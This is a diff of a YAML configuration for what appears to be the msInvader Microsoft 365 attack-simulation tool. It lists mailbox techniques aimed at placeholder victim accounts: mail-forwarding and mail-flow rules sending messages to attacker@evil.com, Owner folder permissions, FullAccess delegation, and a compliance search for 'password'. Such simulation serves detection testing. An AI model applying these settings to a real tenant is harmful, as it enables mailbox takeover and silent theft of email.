@@ -1,14 +1,74 @@
-application_id: "your-app-id"
-tenant_id: "your-tenant-id"
-client_secret: "your-client-secret"
+
+authentication:
+  tenant_id: "your-tenant-id"
+
+  #Used for service principal authentication
+  application_id : "client-app-id"
+  client_secret  : "s3cret"
+
+  # Used for user authentication
+  username: "victim@victim.com"
+  password: "s3cret"
+
 techniques:
-  - technique: "read_email_with_graph"
-    enable: False
+
+  - technique: "read_email"
+    enabled: False
     parameters:
-      user  : "victim@contoso.com"
-      mails : 5
-  - technique: "read_email_with_ews"
-    enabled : True
+      auth_type : 1
+      method: "graph"
+      mailbox: "victim@victim.com"
+      limit : 5
+
+  - technique: "create_rule"
+    enabled: False
     parameters:
-      user  : "victim@contoso.com"
-      mails : 5
+      auth_type : 1
+      method: "graph"
+      mailbox: "victim@victim.com"
+      rule_name : "msinvader rule 33" 
+      forward_to : "attacker@evil.com"
+      body_contains : "invoice"
+
+  - technique: "enable_email_forwarding"
+    enabled: False
+    parameters:
+      auth_type : 1
+      method : "rest"
+      mailbox: "victim@victim.com"
+      forward_to : "attacker@evil.com"
+                
+  - technique: "add_folder_permission"
+    enabled: False
+    parameters:
+      auth_type : 1
+      method : "rest"
+      mailbox : "victim@victim.com"
+      folder: "Inbox"
+      grantee : "Default"
+      access_rights : "Owner"   
+                
+  - technique: "add_mailbox_delegation"
+    enabled: False
+    parameters:
+      auth_type : 1
+      method : "rest"
+      mailbox: "victim@victim.com"
+      grantee : "attacker@victim.com"
+      access_rights : "FullAccess"
+                
+  - technique: "run_compliance_search"
+    enabled: False
+    parameters:
+      auth_type : 1
+      method : "rest"
+      keyword : "password"
+      name : "msInvader 365 compliance search"
+                                  
+  - technique: "create_mailfow_rule"
+    enabled: False
+    parameters:
+      auth_type : 1
+      method : "rest"
+      forward_to : "attacker@evil.com"
+      name : "msInvader mailfow rule"
